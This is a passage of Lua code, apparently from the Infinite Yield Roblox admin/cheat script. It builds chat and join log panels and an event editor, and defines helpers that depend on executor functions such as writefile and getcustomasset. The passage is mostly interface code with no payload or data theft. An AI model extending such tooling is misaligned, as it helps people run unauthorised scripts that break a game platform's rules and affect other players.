		PopupText.FontSize = Enum.FontSize.Size14
		PopupText.Text = "Logs"
		PopupText.TextColor3 = Color3.new(1, 1, 1)
		PopupText.TextWrapped = true
		table.insert(text1,PopupText)
	
		Exit.Name = "Exit"
		Exit.Parent = shadow
		Exit.BackgroundTransparency = 1
		Exit.Position = UDim2.new(1, -20, 0, 0)
		Exit.Size = UDim2.new(0, 20, 0, 20)
		Exit.ZIndex = 10
		Exit.Text = ""
	
		ImageLabel_2.Parent = Exit
		ImageLabel_2.BackgroundColor3 = Color3.new(1, 1, 1)
		ImageLabel_2.BackgroundTransparency = 1
		ImageLabel_2.Position = UDim2.new(0, 5, 0, 5)
		ImageLabel_2.Size = UDim2.new(0, 10, 0, 10)
		ImageLabel_2.Image = getcustomasset("infiniteyield/assets/close.png")
		ImageLabel_2.ZIndex = 10
	
		background.Name = "background"
		background.Parent = logs
		background.Active = true
		background.BackgroundColor3 = Color3.new(0.141176, 0.141176, 0.145098)
		background.BorderSizePixel = 0
		background.ClipsDescendants = true
		background.Position = UDim2.new(0, 0, 1, 0)
		background.Size = UDim2.new(0, 338, 0, 245)
		background.ZIndex = 10
	
		chat.Name = "chat"
		chat.Parent = background
		chat.Active = true
		chat.BackgroundColor3 = Color3.new(0.141176, 0.141176, 0.145098)
		chat.BorderSizePixel = 0
		chat.ClipsDescendants = true
		chat.Size = UDim2.new(0, 338, 0, 245)
		chat.ZIndex = 10
		table.insert(shade1,chat)
	
		Clear.Name = "Clear"
		Clear.Parent = chat
		Clear.BackgroundColor3 = Color3.new(0.180392, 0.180392, 0.184314)
		Clear.BorderSizePixel = 0
		Clear.Position = UDim2.new(0, 5, 0, 220)
		Clear.Size = UDim2.new(0, 50, 0, 20)
		Clear.ZIndex = 10
		Clear.Font = Enum.Font.SourceSans
		Clear.FontSize = Enum.FontSize.Size14
		Clear.Text = "Clear"
		Clear.TextColor3 = Color3.new(1, 1, 1)
		table.insert(shade2,Clear)
		table.insert(text1,Clear)
	
		SaveChatlogs.Name = "SaveChatlogs"
		SaveChatlogs.Parent = chat
		SaveChatlogs.BackgroundColor3 = Color3.new(0.180392, 0.180392, 0.184314)
		SaveChatlogs.BorderSizePixel = 0
		SaveChatlogs.Position = UDim2.new(0, 258, 0, 220)
		SaveChatlogs.Size = UDim2.new(0, 75, 0, 20)
		SaveChatlogs.ZIndex = 10
		SaveChatlogs.Font = Enum.Font.SourceSans
		SaveChatlogs.FontSize = Enum.FontSize.Size14
		SaveChatlogs.Text = "Save To .txt"
		SaveChatlogs.TextColor3 = Color3.new(1, 1, 1)
		table.insert(shade2,SaveChatlogs)
		table.insert(text1,SaveChatlogs)
	
		Toggle.Name = "Toggle"
		Toggle.Parent = chat
		Toggle.BackgroundColor3 = Color3.new(0.180392, 0.180392, 0.184314)
		Toggle.BorderSizePixel = 0
		Toggle.Position = UDim2.new(0, 60, 0, 220)
		Toggle.Size = UDim2.new(0, 66, 0, 20)
		Toggle.ZIndex = 10
		Toggle.Font = Enum.Font.SourceSans
		Toggle.FontSize = Enum.FontSize.Size14
		Toggle.Text = "Disabled"
		Toggle.TextColor3 = Color3.new(1, 1, 1)
		table.insert(shade2,Toggle)
		table.insert(text1,Toggle)
	
		scroll_2.Name = "scroll"
		scroll_2.Parent = chat
		scroll_2.BackgroundColor3 = Color3.new(0.180392, 0.180392, 0.184314)
		scroll_2.BorderSizePixel = 0
		scroll_2.Position = UDim2.new(0, 5, 0, 25)
		scroll_2.Size = UDim2.new(0, 328, 0, 190)
		scroll_2.ZIndex = 10
		scroll_2.BottomImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
		scroll_2.CanvasSize = UDim2.new(0, 0, 0, 10)
		scroll_2.ScrollBarThickness = 8
		scroll_2.TopImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
		table.insert(scroll,scroll_2)
		table.insert(shade2,scroll_2)
	
		join.Name = "join"
		join.Parent = background
		join.Active = true
		join.BackgroundColor3 = Color3.new(0.141176, 0.141176, 0.145098)
		join.BorderSizePixel = 0
		join.ClipsDescendants = true
		join.Size = UDim2.new(0, 338, 0, 245)
		join.Visible = false
		join.ZIndex = 10
		table.insert(shade1,join)
	
		Toggle_2.Name = "Toggle"
		Toggle_2.Parent = join
		Toggle_2.BackgroundColor3 = Color3.new(0.180392, 0.180392, 0.184314)
		Toggle_2.BorderSizePixel = 0
		Toggle_2.Position = UDim2.new(0, 60, 0, 220)
		Toggle_2.Size = UDim2.new(0, 66, 0, 20)
		Toggle_2.ZIndex = 10
		Toggle_2.Font = Enum.Font.SourceSans
		Toggle_2.FontSize = Enum.FontSize.Size14
		Toggle_2.Text = "Disabled"
		Toggle_2.TextColor3 = Color3.new(1, 1, 1)
		table.insert(shade2,Toggle_2)
		table.insert(text1,Toggle_2)
	
		Clear_2.Name = "Clear"
		Clear_2.Parent = join
		Clear_2.BackgroundColor3 = Color3.new(0.180392, 0.180392, 0.184314)
		Clear_2.BorderSizePixel = 0
		Clear_2.Position = UDim2.new(0, 5, 0, 220)
		Clear_2.Size = UDim2.new(0, 50, 0, 20)
		Clear_2.ZIndex = 10
		Clear_2.Font = Enum.Font.SourceSans
		Clear_2.FontSize = Enum.FontSize.Size14
		Clear_2.Text = "Clear"
		Clear_2.TextColor3 = Color3.new(1, 1, 1)
		table.insert(shade2,Clear_2)
		table.insert(text1,Clear_2)
	
		scroll_3.Name = "scroll"
		scroll_3.Parent = join
		scroll_3.BackgroundColor3 = Color3.new(0.180392, 0.180392, 0.184314)
		scroll_3.BorderSizePixel = 0
		scroll_3.Position = UDim2.new(0, 5, 0, 25)
		scroll_3.Size = UDim2.new(0, 328, 0, 190)
		scroll_3.ZIndex = 10
		scroll_3.BottomImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
		scroll_3.CanvasSize = UDim2.new(0, 0, 0, 10)
		scroll_3.ScrollBarThickness = 8
		scroll_3.TopImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
		table.insert(scroll,scroll_3)
		table.insert(shade2,scroll_3)
	
		selectChat.Name = "selectChat"
		selectChat.Parent = background
		selectChat.BackgroundColor3 = Color3.new(0.180392, 0.180392, 0.184314)
		selectChat.BorderSizePixel = 0
		selectChat.Position = UDim2.new(0, 5, 0, 5)
		selectChat.Size = UDim2.new(0, 164, 0, 20)
		selectChat.ZIndex = 10
		selectChat.Font = Enum.Font.SourceSans
		selectChat.FontSize = Enum.FontSize.Size14
		selectChat.Text = "Chat Logs"
		selectChat.TextColor3 = Color3.new(1, 1, 1)
		table.insert(shade2,selectChat)
		table.insert(text1,selectChat)
	
		selectJoin.Name = "selectJoin"
		selectJoin.Parent = background
		selectJoin.BackgroundColor3 = Color3.new(0.305882, 0.305882, 0.309804)
		selectJoin.BorderSizePixel = 0
		selectJoin.Position = UDim2.new(0, 169, 0, 5)
		selectJoin.Size = UDim2.new(0, 164, 0, 20)
		selectJoin.ZIndex = 10
		selectJoin.Font = Enum.Font.SourceSans
		selectJoin.FontSize = Enum.FontSize.Size14
		selectJoin.Text = "Join Logs"
		selectJoin.TextColor3 = Color3.new(1, 1, 1)
		table.insert(shade3,selectJoin)
		table.insert(text1,selectJoin)
	
		function create(data)
			local insts = {}
			for i,v in pairs(data) do insts[v[1]] = Instance.new(v[2]) end
	
			for _,v in pairs(data) do
				for prop,val in pairs(v[3]) do
					if type(val) == "table" then
						insts[v[1]][prop] = insts[val[1]]
					else
						insts[v[1]][prop] = val
					end
				end
			end
	
			return insts[1]
		end
	
		ViewportTextBox = (function()
	
			local funcs = {}
			funcs.Update = function(self)
				local cursorPos = self.TextBox.CursorPosition
				local text = self.TextBox.Text
				if text == "" then self.TextBox.Position = UDim2.new(0,2,0,0) return end
				if cursorPos == -1 then return end
	
				local cursorText = text:sub(1,cursorPos-1)
				local pos = nil
				local leftEnd = -self.TextBox.Position.X.Offset
				local rightEnd = leftEnd + self.View.AbsoluteSize.X
	
				local totalTextSize = TextService:GetTextSize(text,self.TextBox.TextSize,self.TextBox.Font,Vector2.new(999999999,100)).X
				local cursorTextSize = TextService:GetTextSize(cursorText,self.TextBox.TextSize,self.TextBox.Font,Vector2.new(999999999,100)).X
	
				if cursorTextSize > rightEnd then
					pos = math.max(-2,cursorTextSize - self.View.AbsoluteSize.X + 2)
				elseif cursorTextSize < leftEnd then
					pos = math.max(-2,cursorTextSize-2)
				elseif totalTextSize < rightEnd then
					pos = math.max(-2,totalTextSize - self.View.AbsoluteSize.X + 2)
				end
	
				if pos then
					self.TextBox.Position = UDim2.new(0,-pos,0,0)
					self.TextBox.Size = UDim2.new(1,pos,1,0)
				end
			end
	
			local mt = {}
			mt.__index = funcs
	
			local function convert(textbox)
				local obj = setmetatable({OffsetX = 0, TextBox = textbox},mt)
	
				local view = Instance.new("Frame")
				view.BackgroundTransparency = textbox.BackgroundTransparency
				view.BackgroundColor3 = textbox.BackgroundColor3
				view.BorderSizePixel = textbox.BorderSizePixel
				view.BorderColor3 = textbox.BorderColor3
				view.Position = textbox.Position
				view.Size = textbox.Size
				view.ClipsDescendants = true
				view.Name = textbox.Name
				view.ZIndex = 10
				textbox.BackgroundTransparency = 1
				textbox.Position = UDim2.new(0,4,0,0)
				textbox.Size = UDim2.new(1,-8,1,0)
				textbox.TextXAlignment = Enum.TextXAlignment.Left
				textbox.Name = "Input"
				table.insert(text1,textbox)
				table.insert(shade2,view)
	
				obj.View = view
	
				textbox.Changed:Connect(function(prop)
					if prop == "Text" or prop == "CursorPosition" or prop == "AbsoluteSize" then
						obj:Update()
					end
				end)
	
				obj:Update()
	
				view.Parent = textbox.Parent
				textbox.Parent = view
	
				return obj
			end
	
			return {convert = convert}
		end)()
	
		ViewportTextBox.convert(Cmdbar).View.ZIndex = 10
		ViewportTextBox.convert(Cmdbar_2).View.ZIndex = 10
		ViewportTextBox.convert(Cmdbar_3).View.ZIndex = 10
	
		function writefileExploit()
			if writefile then
				return true
			end
		end
	
		function readfileExploit()
			if readfile then
				return true
			end
		end
	
		function isNumber(str)
			if tonumber(str) ~= nil or str == 'inf' then
				return true
			end
		end
	
		function vtype(o, t)
			if o == nil then return false end
			if type(o) == "userdata" then return typeof(o) == t end
			return type(o) == t
		end
	
		function getRoot(char)
			local rootPart = char:FindFirstChild('HumanoidRootPart') or char:FindFirstChild('Torso') or char:FindFirstChild('UpperTorso')
			return rootPart
		end
	
		function tools(plr)
			if plr:FindFirstChildOfClass("Backpack"):FindFirstChildOfClass('Tool') or plr.Character:FindFirstChildOfClass('Tool') then
				return true
			end
		end
	
		function r15(plr)
			if plr.Character:FindFirstChildOfClass('Humanoid').RigType == Enum.HumanoidRigType.R15 then
				return true
			end
		end
	
		function toClipboard(txt)
			if everyClipboard then
				everyClipboard(tostring(txt))
				notify("Clipboard", "Copied to clipboard")
			else
				notify("Clipboard", "Your exploit doesn't have the ability to use the clipboard")
			end
		end
	
		function chatMessage(str)
			str = tostring(str)
			if not isLegacyChat then
				TextChatService.TextChannels.RBXGeneral:SendAsync(str)
			else
				ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(str, "All")
			end
		end
	
		function getHierarchy(obj)
			local fullname
			local period
	
			if string.find(obj.Name,' ') then
				fullname = '["'..obj.Name..'"]'
				period = false
			else
				fullname = obj.Name
				period = true
			end
	
			local getS = obj
			local parent = obj
			local service = ''
	
			if getS.Parent ~= game then
				repeat
					getS = getS.Parent
					service = getS.ClassName
				until getS.Parent == game
			end
	
			if parent.Parent ~= getS then
				repeat
					parent = parent.Parent
					if string.find(tostring(parent),' ') then
						if period then
							fullname = '["'..parent.Name..'"].'..fullname
						else
							fullname = '["'..parent.Name..'"]'..fullname
						end
						period = false
					else
						if period then
							fullname = parent.Name..'.'..fullname
						else
							fullname = parent.Name..''..fullname
						end
						period = true
					end
				until parent.Parent == getS
			elseif string.find(tostring(parent),' ') then
				fullname = '["'..parent.Name..'"]'
				period = false
			end
	
			if period then
				return 'game:GetService("'..service..'").'..fullname
			else
				return 'game:GetService("'..service..'")'..fullname
			end
		end
	
		AllWaypoints = {}
	
		local cooldown = false
		function writefileCooldown(name,data)
			task.spawn(function()
				if not cooldown then
					cooldown = true
					writefile(name, data, true)
				else
					repeat wait() until cooldown == false
					writefileCooldown(name,data)
				end
				wait(3)
				cooldown = false
			end)
		end
	
		function dragGUI(gui)
			task.spawn(function()
				local dragging
				local dragInput
				local dragStart = Vector3.new(0,0,0)
				local startPos
				local function update(input)
					local delta = input.Position - dragStart
					local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
					TweenService:Create(gui, TweenInfo.new(.20), {Position = Position}):Play()
				end
				gui.InputBegan:Connect(function(input)
					if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
						dragging = true
						dragStart = input.Position
						startPos = gui.Position
	
						input.Changed:Connect(function()
							if input.UserInputState == Enum.UserInputState.End then
								dragging = false
							end
						end)
					end
				end)
				gui.InputChanged:Connect(function(input)
					if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
						dragInput = input
					end
				end)
				UserInputService.InputChanged:Connect(function(input)
					if input == dragInput and dragging then
						update(input)
					end
				end)
			end)
		end
	
		dragGUI(logs)
		dragGUI(KeybindEditor)
		dragGUI(PluginEditor)
		dragGUI(ToPartFrame)
	
		eventEditor = (function()
			local events = {}
	
			local function registerEvent(name,sets)
				events[name] = {
					commands = {},
					sets = sets or {}
				}
			end
	
			local onEdited = nil
	
			local function fireEvent(name,...)
				local args = {...}
				local event = events[name]
				if event then
					for i,cmd in pairs(event.commands) do
						local metCondition = true
						for idx,set in pairs(event.sets) do
							local argVal = args[idx]
							local cmdSet = cmd[2][idx]
							local condType = set.Type
							if condType == "Player" then
								if cmdSet == 0 then
									metCondition = metCondition and (tostring(Players.LocalPlayer) == argVal)
								elseif cmdSet ~= 1 then
									metCondition = metCondition and table.find(getPlayer(cmdSet,Players.LocalPlayer),argVal)
								end
							elseif condType == "String" then
								if cmdSet ~= 0 then
									metCondition = metCondition and string.find(argVal:lower(),cmdSet:lower())
								end
							elseif condType == "Number" then
								if cmdSet ~= 0 then
									metCondition = metCondition and tonumber(argVal)<=tonumber(cmdSet)
								end
							end
							if not metCondition then break end
						end
	
						if metCondition then
							pcall(task.spawn(function()
								local cmdStr = cmd[1]
								for count,arg in pairs(args) do
									cmdStr = cmdStr:gsub("%$"..count,arg)
								end
								wait(cmd[3] or 0)
								execCmd(cmdStr)
							end))
						end
					end
				end
			end
	
			local main = create({
				{1,"Frame",{BackgroundColor3=Color3.new(0.14117647707462,0.14117647707462,0.14509804546833),BackgroundTransparency=1,BorderSizePixel=0,Name="EventEditor",Position=UDim2.new(0.5,-175,0,-500),Size=UDim2.new(0,350,0,20),ZIndex=10,}},
				{2,"Frame",{BackgroundColor3=currentShade2,BorderSizePixel=0,Name="TopBar",Parent={1},Size=UDim2.new(1,0,0,20),ZIndex=10,}},
				{3,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Title",Parent={2},Position=UDim2.new(0,0,0,0),Size=UDim2.new(1,0,0.95,0),Text="Event Editor",TextColor3=Color3.new(1,1,1),TextSize=14,TextXAlignment=Enum.TextXAlignment.Center,ZIndex=10,}},
				{4,"TextButton",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Close",Parent={2},Position=UDim2.new(1,-20,0,0),Size=UDim2.new(0,20,0,20),Text="",TextColor3=Color3.new(1,1,1),TextSize=14,ZIndex=10,}},
				{5,"ImageLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Image=getcustomasset("infiniteyield/assets/close.png"),Parent={4},Position=UDim2.new(0,5,0,5),Size=UDim2.new(0,10,0,10),ZIndex=10,}},
				{6,"Frame",{BackgroundColor3=currentShade1,BorderSizePixel=0,Name="Content",Parent={1},Position=UDim2.new(0,0,0,20),Size=UDim2.new(1,0,0,202),ZIndex=10,}},
				{7,"ScrollingFrame",{BackgroundColor3=Color3.new(0.14117647707462,0.14117647707462,0.14509804546833),BackgroundTransparency=1,BorderColor3=Color3.new(0.15686275064945,0.15686275064945,0.15686275064945),BorderSizePixel=0,BottomImage="rbxasset://textures/ui/Scroll/scroll-middle.png",CanvasSize=UDim2.new(0,0,0,100),Name="List",Parent={6},Position=UDim2.new(0,5,0,5),ScrollBarImageColor3=Color3.new(0.30588236451149,0.30588236451149,0.3098039329052),ScrollBarThickness=8,Size=UDim2.new(1,-10,1,-10),TopImage="rbxasset://textures/ui/Scroll/scroll-middle.png",ZIndex=10,}},
				{8,"Frame",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Name="Holder",Parent={7},Size=UDim2.new(1,0,1,0),ZIndex=10,}},
				{9,"UIListLayout",{Parent={8},SortOrder=2,}},
				{10,"Frame",{BackgroundColor3=Color3.new(0.14117647707462,0.14117647707462,0.14509804546833),BackgroundTransparency=1,BorderColor3=Color3.new(0.3137255012989,0.3137255012989,0.3137255012989),BorderSizePixel=0,ClipsDescendants=true,Name="Settings",Parent={6},Position=UDim2.new(1,0,0,0),Size=UDim2.new(0,150,1,0),ZIndex=10,}},
				{11,"Frame",{BackgroundColor3=Color3.new(0.14117647707462,0.14117647707462,0.14509804546833),Name="Slider",Parent={10},Position=UDim2.new(0,-150,0,0),Size=UDim2.new(1,0,1,0),ZIndex=10,}},
				{12,"Frame",{BackgroundColor3=Color3.new(0.23529413342476,0.23529413342476,0.23529413342476),BorderColor3=Color3.new(0.3137255012989,0.3137255012989,0.3137255012989),BorderSizePixel=0,Name="Line",Parent={11},Size=UDim2.new(0,1,1,0),ZIndex=10,}},
				{13,"ScrollingFrame",{BackgroundColor3=Color3.new(0.14117647707462,0.14117647707462,0.14509804546833),BackgroundTransparency=1,BorderColor3=Color3.new(0.15686275064945,0.15686275064945,0.15686275064945),BorderSizePixel=0,BottomImage="rbxasset://textures/ui/Scroll/scroll-middle.png",CanvasSize=UDim2.new(0,0,0,100),Name="List",Parent={11},Position=UDim2.new(0,0,0,25),ScrollBarImageColor3=Color3.new(0.30588236451149,0.30588236451149,0.3098039329052),ScrollBarThickness=8,Size=UDim2.new(1,0,1,-25),TopImage="rbxasset://textures/ui/Scroll/scroll-middle.png",ZIndex=10,}},
				{14,"Frame",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Name="Holder",Parent={13},Size=UDim2.new(1,0,1,0),ZIndex=10,}},
				{15,"UIListLayout",{Parent={14},SortOrder=2,}},
				{16,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Title",Parent={11},Size=UDim2.new(1,0,0,20),Text="Event Settings",TextColor3=Color3.new(1,1,1),TextSize=14,ZIndex=10,}},
				{17,"TextButton",{BackgroundColor3=Color3.new(0.14117647707462,0.14117647707462,0.14509804546833),BorderColor3=Color3.new(0.15686275064945,0.15686275064945,0.15686275064945),Font=3,Name="Close",BorderSizePixel=0,Parent={11},Position=UDim2.new(1,-20,0,0),Size=UDim2.new(0,20,0,20),Text="<",TextColor3=Color3.new(1,1,1),TextSize=18,ZIndex=10,}},
				{18,"Folder",{Name="Templates",Parent={10},}},
				{19,"Frame",{BackgroundColor3=Color3.new(0.19607844948769,0.19607844948769,0.19607844948769),BackgroundTransparency=1,BorderColor3=Color3.new(0.15686275064945,0.15686275064945,0.15686275064945),Name="Players",Parent={18},Position=UDim2.new(0,0,0,25),Size=UDim2.new(1,0,0,86),Visible=false,ZIndex=10,}},
				{20,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Title",Parent={19},Size=UDim2.new(1,0,0,20),Text="Choose Players",TextColor3=Color3.new(1,1,1),TextSize=14,ZIndex=10,}},
				{21,"TextLabel",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="Any",Parent={19},Position=UDim2.new(0,5,0,42),Size=UDim2.new(1,-10,0,20),Text="Any Player",TextColor3=Color3.new(1,1,1),TextSize=14,TextXAlignment=0,ZIndex=10,}},
				{22,"Frame",{BackgroundColor3=Color3.new(0.30588236451149,0.30588236451149,0.3098039329052),BorderSizePixel=0,Name="Button",Parent={21},Position=UDim2.new(1,-20,0,0),Size=UDim2.new(0,20,0,20),ZIndex=10,}},
				{23,"TextButton",{BackgroundColor3=Color3.new(0.58823531866074,0.58823531866074,0.59215688705444),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="On",Parent={22},Position=UDim2.new(0,2,0,2),Size=UDim2.new(0,16,0,16),Text="",TextColor3=Color3.new(0,0,0),TextSize=14,ZIndex=10,}},
				{24,"TextLabel",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="Me",Parent={19},Position=UDim2.new(0,5,0,20),Size=UDim2.new(1,-10,0,20),Text="Me Only",TextColor3=Color3.new(1,1,1),TextSize=14,TextXAlignment=0,ZIndex=10,}},
				{25,"Frame",{BackgroundColor3=Color3.new(0.30588236451149,0.30588236451149,0.3098039329052),BorderSizePixel=0,Name="Button",Parent={24},Position=UDim2.new(1,-20,0,0),Size=UDim2.new(0,20,0,20),ZIndex=10,}},
				{26,"TextButton",{BackgroundColor3=Color3.new(0.58823531866074,0.58823531866074,0.59215688705444),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="On",Parent={25},Position=UDim2.new(0,2,0,2),Size=UDim2.new(0,16,0,16),Text="",TextColor3=Color3.new(0,0,0),TextSize=14,ZIndex=10,}},
				{27,"TextBox",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BorderColor3=Color3.new(0.15686275064945,0.15686275064945,0.15686275064945),BorderSizePixel=0,ClearTextOnFocus=false,Font=3,Name="Custom",Parent={19},PlaceholderColor3=Color3.new(0.47058826684952,0.47058826684952,0.47058826684952),PlaceholderText="Custom Player Set",Position=UDim2.new(0,5,0,64),Size=UDim2.new(1,-35,0,20),Text="",TextColor3=Color3.new(1,1,1),TextSize=14,TextXAlignment=0,ZIndex=10,}},
				{28,"Frame",{BackgroundColor3=Color3.new(0.30588236451149,0.30588236451149,0.3098039329052),BorderSizePixel=0,Name="CustomButton",Parent={19},Position=UDim2.new(1,-25,0,64),Size=UDim2.new(0,20,0,20),ZIndex=10,}},
				{29,"TextButton",{BackgroundColor3=Color3.new(0.58823531866074,0.58823531866074,0.59215688705444),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="On",Parent={28},Position=UDim2.new(0,2,0,2),Size=UDim2.new(0,16,0,16),Text="",TextColor3=Color3.new(0,0,0),TextSize=14,ZIndex=10,}},
				{30,"Frame",{BackgroundColor3=Color3.new(0.19607844948769,0.19607844948769,0.19607844948769),BackgroundTransparency=1,BorderColor3=Color3.new(0.15686275064945,0.15686275064945,0.15686275064945),Name="Strings",Parent={18},Position=UDim2.new(0,0,0,25),Size=UDim2.new(1,0,0,64),Visible=false,ZIndex=10,}},
				{31,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Title",Parent={30},Size=UDim2.new(1,0,0,20),Text="Choose String",TextColor3=Color3.new(1,1,1),TextSize=14,ZIndex=10,}},
				{32,"TextLabel",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="Any",Parent={30},Position=UDim2.new(0,5,0,20),Size=UDim2.new(1,-10,0,20),Text="Any String",TextColor3=Color3.new(1,1,1),TextSize=14,TextXAlignment=0,ZIndex=10,}},
				{33,"Frame",{BackgroundColor3=Color3.new(0.30588236451149,0.30588236451149,0.3098039329052),BorderSizePixel=0,Name="Button",Parent={32},Position=UDim2.new(1,-20,0,0),Size=UDim2.new(0,20,0,20),ZIndex=10,}},
				{34,"TextButton",{BackgroundColor3=Color3.new(0.58823531866074,0.58823531866074,0.59215688705444),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="On",Parent={33},Position=UDim2.new(0,2,0,2),Size=UDim2.new(0,16,0,16),Text="",TextColor3=Color3.new(0,0,0),TextSize=14,ZIndex=10,}},
				{54,"Frame",{BackgroundColor3=Color3.new(0.19607844948769,0.19607844948769,0.19607844948769),BackgroundTransparency=1,BorderColor3=Color3.new(0.15686275064945,0.15686275064945,0.15686275064945),Name="Numbers",Parent={18},Position=UDim2.new(0,0,0,25),Size=UDim2.new(1,0,0,64),Visible=false,ZIndex=10,}},
				{55,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Title",Parent={54},Size=UDim2.new(1,0,0,20),Text="Choose String",TextColor3=Color3.new(1,1,1),TextSize=14,ZIndex=10,}},
				{56,"TextLabel",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="Any",Parent={54},Position=UDim2.new(0,5,0,20),Size=UDim2.new(1,-10,0,20),Text="Any Number",TextColor3=Color3.new(1,1,1),TextSize=14,TextXAlignment=0,ZIndex=10,}},
				{57,"Frame",{BackgroundColor3=Color3.new(0.30588236451149,0.30588236451149,0.3098039329052),BorderSizePixel=0,Name="Button",Parent={56},Position=UDim2.new(1,-20,0,0),Size=UDim2.new(0,20,0,20),ZIndex=10,}},
				{58,"TextButton",{BackgroundColor3=Color3.new(0.58823531866074,0.58823531866074,0.59215688705444),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="On",Parent={57},Position=UDim2.new(0,2,0,2),Size=UDim2.new(0,16,0,16),Text="",TextColor3=Color3.new(0,0,0),TextSize=14,ZIndex=10,}},
				{59,"TextBox",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BorderColor3=Color3.new(0.15686275064945,0.15686275064945,0.15686275064945),BorderSizePixel=0,ClearTextOnFocus=false,Font=3,Name="Custom",Parent={54},PlaceholderColor3=Color3.new(0.47058826684952,0.47058826684952,0.47058826684952),PlaceholderText="Number",Position=UDim2.new(0,5,0,42),Size=UDim2.new(1,-35,0,20),Text="",TextColor3=Color3.new(1,1,1),TextSize=14,TextXAlignment=0,ZIndex=10,}},
				{60,"Frame",{BackgroundColor3=Color3.new(0.30588236451149,0.30588236451149,0.3098039329052),BorderSizePixel=0,Name="CustomButton",Parent={54},Position=UDim2.new(1,-25,0,42),Size=UDim2.new(0,20,0,20),ZIndex=10,}},
				{61,"TextButton",{BackgroundColor3=Color3.new(0.58823531866074,0.58823531866074,0.59215688705444),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="On",Parent={60},Position=UDim2.new(0,2,0,2),Size=UDim2.new(0,16,0,16),Text="",TextColor3=Color3.new(0,0,0),TextSize=14,ZIndex=10,}},
				{35,"TextBox",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BorderColor3=Color3.new(0.15686275064945,0.15686275064945,0.15686275064945),BorderSizePixel=0,ClearTextOnFocus=false,Font=3,Name="Custom",Parent={30},PlaceholderColor3=Color3.new(0.47058826684952,0.47058826684952,0.47058826684952),PlaceholderText="Match String",Position=UDim2.new(0,5,0,42),Size=UDim2.new(1,-35,0,20),Text="",TextColor3=Color3.new(1,1,1),TextSize=14,TextXAlignment=0,ZIndex=10,}},
				{36,"Frame",{BackgroundColor3=Color3.new(0.30588236451149,0.30588236451149,0.3098039329052),BorderSizePixel=0,Name="CustomButton",Parent={30},Position=UDim2.new(1,-25,0,42),Size=UDim2.new(0,20,0,20),ZIndex=10,}},
				{37,"TextButton",{BackgroundColor3=Color3.new(0.58823531866074,0.58823531866074,0.59215688705444),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="On",Parent={36},Position=UDim2.new(0,2,0,2),Size=UDim2.new(0,16,0,16),Text="",TextColor3=Color3.new(0,0,0),TextSize=14,ZIndex=10,}},
				{38,"Frame",{BackgroundColor3=Color3.new(0.19607844948769,0.19607844948769,0.19607844948769),BackgroundTransparency=1,BorderColor3=Color3.new(0.15686275064945,0.15686275064945,0.15686275064945),Name="DelayEditor",Parent={18},Position=UDim2.new(0,0,0,25),Size=UDim2.new(1,0,0,24),Visible=false,ZIndex=10,}},
				{39,"TextBox",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BorderColor3=Color3.new(0.15686275064945,0.15686275064945,0.15686275064945),BorderSizePixel=0,Font=3,Name="Secs",Parent={38},PlaceholderColor3=Color3.new(0.47058826684952,0.47058826684952,0.47058826684952),Position=UDim2.new(0,60,0,2),Size=UDim2.new(1,-65,0,20),Text="",TextColor3=Color3.new(1,1,1),TextSize=14,TextXAlignment=0,ZIndex=10,}},
				{40,"TextLabel",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="Label",Parent={39},Position=UDim2.new(0,-55,0,0),Size=UDim2.new(1,0,1,0),Text="Delay (s):",TextColor3=Color3.new(1,1,1),TextSize=14,TextXAlignment=0,ZIndex=10,}},
				{41,"Frame",{BackgroundColor3=currentShade1,BorderSizePixel=0,ClipsDescendants=true,Name="EventTemplate",Parent={6},Size=UDim2.new(1,0,0,20),Visible=false,ZIndex=10,}},
				{42,"TextButton",{BackgroundColor3=currentText1,BackgroundTransparency=1,Font=3,Name="Expand",Parent={41},Size=UDim2.new(0,20,0,20),Text=">",TextColor3=Color3.new(1,1,1),TextSize=18,ZIndex=10,}},
